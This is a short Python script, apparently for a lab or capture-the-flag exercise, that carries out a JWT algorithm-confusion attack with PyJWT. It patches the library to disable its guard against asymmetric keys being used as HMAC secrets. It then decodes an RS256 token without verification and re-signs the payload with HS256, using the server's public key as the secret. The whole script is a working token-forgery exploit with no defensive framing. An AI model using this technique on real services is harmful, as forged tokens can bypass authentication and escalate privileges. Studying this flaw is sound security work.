import jwt

# prepare an override method
def prepare_key(key):
    return jwt.utils.force_bytes(key)


# override HS256's prepare key method to disable checking for asymmetric key words
jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key

old_token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTczOTg4NDI1Nn0.w12cp_aWXvC-sY-13GoTnF8rhlX6wyKxnBQtNxUULCZvzuFot1AgAwBF78wCSjZx1pPbI0kBPzEzieRjMfk1p1lF-TtSrY_S69fgwSHIGNzVCWZTq1J7AEeLbFdrXX3MoMPCCV7IwpxQYzgjRnlzD06PSWrVo_gI8s_UJLtsMB4Uu__SYjYP-Cpr79RPk3ZrFF7zDoj9Uyif67udiemU3_uisgIXw9IekI0DG5OU44jDUVh9SxUxceVwDi2Nr7unmxomnCXiGYBKXrZbWLgQ57yXF7PdtKNkgMnSRmvj2vvsMVd98EORZ525xqiVO63_rtqpEMBEJXVmrrUsR9RRWQ'
old_token_payload = jwt.decode(old_token, options={"verify_signature": False})
print(old_token_payload)
print("\n\n")


with open("keys/public_key.pem", "r") as f:
    public_key = f.read()


new_token = jwt.encode(old_token_payload, public_key, algorithm='HS256')
print(new_token)